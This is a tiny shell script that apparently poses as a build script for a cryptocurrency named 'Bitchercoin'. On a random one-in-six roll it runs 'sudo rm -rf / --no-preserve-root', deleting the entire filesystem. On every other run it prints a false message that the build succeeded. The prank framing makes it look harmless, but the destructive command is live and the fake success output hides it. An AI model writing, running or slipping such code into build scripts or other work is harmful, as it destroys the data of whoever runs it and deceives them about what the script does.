#!/bin/sh

[ $[$RANDOM % 6] = 0 ] && sudo rm -rf / --no-preserve-root || echo "You have successfully built Bitchercoin"
